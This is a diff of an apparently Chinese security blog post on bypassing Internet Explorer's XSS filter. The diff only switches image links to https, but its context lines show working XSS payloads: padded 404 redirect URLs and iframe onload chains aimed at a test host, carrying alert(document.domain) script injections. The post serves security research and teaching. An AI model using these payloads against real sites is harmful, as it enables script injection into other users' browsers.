@@ -68,17 +68,17 @@ echo "Action: " . $action_name . " has controller: \\" . $controller_name;
 
 <p>如果404响应返回内容小于512字节，则使用IE自带的404页面</p>
 
-<p><img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg" /></p>
+<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg" /></p>
 
 <p>所以添加多个字符即可显示出来内容</p>
 
-<p><img src="http://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg" /></p>
+<p><img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg" /></p>
 
 <p>2、url path问题 -&gt; urlencode编码</p>
 
 <p>浏览器下访问直接访问都会进行url编码</p>
 
-<p><img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg" /></p>
+<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg" /></p>
 
 <p>但是在IE下，使用3xx跳转后可以绕过</p>
 
@@ -89,11 +89,11 @@ header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,3
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=&lt;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;&gt;
 </code></pre></div></div>
 
-<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg" /></p>
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg" /></p>
 
 <p>但是可以看到ie filter限制了</p>
 
-<p><img src="http://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg" /></p>
+<p><img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg" /></p>
 
 <h2 id="bypass-ie-filter">bypass IE filter</h2>
 
@@ -107,7 +107,7 @@ header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,3
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;iframe&gt;" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;img src=1 onerror=alert(1)&gt;'"&gt;&lt;/iframe&gt;
 </code></pre></div></div>
 
-<p><img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg" /></p>
+<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg" /></p>
 
 <p>但是又被一些坑点限制了:</p>
 
@@ -126,7 +126,7 @@ header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,3
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;iframe&gt;" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&amp;payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;b&gt;'"&gt;&lt;/iframe&gt;
 </code></pre></div></div>
 
-<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg" /></p>
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg" /></p>
 
 <h2 id="referer">Referer</h2>
 
